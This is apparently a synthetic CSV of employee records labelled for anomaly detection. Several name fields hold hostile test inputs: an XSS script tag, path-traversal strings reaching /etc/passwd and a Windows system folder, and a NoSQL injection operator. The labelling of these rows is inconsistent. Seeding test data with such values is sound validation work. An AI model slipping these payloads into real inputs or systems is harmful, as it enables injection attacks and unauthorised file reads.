employee_id,name,age,salary,years_experience,department,location,performance_score,projects_completed,days_absent,is_anomaly
EMP01696,Diana Johnson,37,116230,9,Finance,Berlin,9.1,12,7,0
EMP01667,Bob Williams,47,82893,9,Engineering,Singapore,7.5,6,5,0
EMP01063,Jane Garcia,25,110917,5,Marketing,San Francisco,5.6,7,3,0
EMP01533,<script>alert('XSS')</script>,25,104814,10,Operations,Tokyo,8.9,12,10,1
EMP01066,Charlie Brown,34,80717,4,Operations,Singapore,6.4,7,4,0
EMP01621,Jane Jones,38,96450,5,Engineering,Berlin,6.8,9,8,0
EMP01346,Alice Jones,23,53074,9,Operations,New York,7.9,10,5,0
EMP01490,Jane Smith,34,82771,9,Engineering,Singapore,7.7,10,3,0
EMP01760,Jane Smith,24,74572,25,Finance,San Francisco,6.6,12,13,1
EMP01456,..\..\windows\system32,34,108451,6,Finance,Tokyo,6.4,12,4,0
EMP01065,Alice Garcia,45,67245,7,Sales,Singapore,8.8,6,6,0
EMP01286,Diana Brown,33,95605,4,Finance,Berlin,8.2,7,4,0
EMP01635,Alice Garcia,22,80651,10,Marketing,Berlin,8.2,8,2,0
EMP01067,Charlie Brown,43,81689,5,Finance,New York,7.6,12,2,0
EMP01327,Charlie Johnson,41,59914,6,Engineering,Berlin,9.5,17,2,0
EMP01395,Jane Johnson,31,83809,12,HR,Berlin,6.2,15,3,0
EMP01244,Bob Smith,25,71547,8,Engineering,London,5.9,19,2,0
EMP01377,John Garcia,36,73033,11,HR,Singapore,7.1,12,5,0
EMP01610,Bob Brown,40,101563,2,HR,London,7.4,15,3,0
EMP01526,Diana Johnson,22,56213,3,Marketing,London,7.3,13,2,0
EMP01658,Jane Brown,36,100795,0,Operations,San Francisco,5.7,14,2,0
EMP01529,Diana Johnson,27,86998,10,Marketing,San Francisco,9.0,9,3,0
EMP01622,Charlie Williams,50,67700,10,Finance,San Francisco,6.9,18,7,0
EMP01721,Jane Brown,22,86641,11,Operations,London,6.6,10,5,0
EMP01360,John Williams,39,40000,7,Finance,San Francisco,8.4,16,4,0
EMP01030,Alice Garcia,30,48110,9,Sales,Singapore,8.3,15,5,0
EMP01260,Diana Jones,27,90433,7,Sales,Berlin,5.7,9,5,0
EMP01637,Charlie Smith,35,107146,4,Finance,Tokyo,7.8,7,1,1
EMP01746,Bob Brown,36,55032,6,Marketing,Berlin,6.4,11,8,0
EMP01570,Charlie Brown,35,71541,11,Sales,San Francisco,4.6,7,5,0
EMP01215,Alice Johnson,41,78958,4,Engineering,Tokyo,8.5,10,6,0
EMP01078,Alice Jones,35,74671,11,Marketing,London,5.5,100,1,1
EMP01578,Alice Brown,25,15000,26,Engineering,San Francisco,8.3,9,6,1
EMP01383,{'$gt': ''},30,43589,11,Sales,San Francisco,5.9,18,6,0
EMP01039,Diana Williams,36,70720,3,Operations,Tokyo,5.1,7,7,0
EMP01023,../../../etc/passwd,23,67743,5,Engineering,Berlin,7.4,17,6,1
EMP01692,Diana Garcia,26,63715,8,Engineering,New York,7.4,11,7,0
EMP01398,Jane Brown,34,79478,7,Marketing,Singapore,7.0,16,3,0
EMP01796,Charlie Garcia,34,87383,4,Sales,Singapore,8.6,13,3,0
EMP01741,Diana Smith,24,110445,9,Sales,Tokyo,4.3,12,4,0
EMP01139,Diana Smith,25,63718,22,Sales,Singapore,7.6,19,4,0
EMP01250,John Brown,24,62488,5,Marketing,San Francisco,6.1,12,3,0
EMP01174,Jane Smith,37,66076,5,Marketing,Singapore,10.0,13,8,0
EMP01323,John Brown,51,52139,8,Finance,New York,9.7,7,7,0
EMP01595,Charlie Johnson,30,78693,5,Operations,Singapore,7.6,16,5,0
EMP01525,Diana Jones,22,40000,10,Engineering,New York,7.9,14,6,0
EMP01423,Alice Garcia,42,83275,2,Finance,Singapore,5.4,8,5,0
EMP01596,Bob Johnson,32,48057,9,Sales,San Francisco,7.9,11,3,0
EMP01604,Charlie Jones,38,94920,4,HR,London,8.3,8,5,0
EMP01534,Charlie Williams,29,77973,6,Engineering,London,8.8,10,5,0
EMP01265,Charlie Williams,25,52606,1,Operations,San Francisco,5.4,12,4,0
EMP01109,Bob Johnson,34,118265,4,Marketing,Singapore,5.5,11,60,1
EMP01666,Jane Smith,32,108398,0,Sales,New York,10.0,16,8,0
EMP01294,Charlie Williams,37,89652,7,Operations,London,8.0,14,4,0
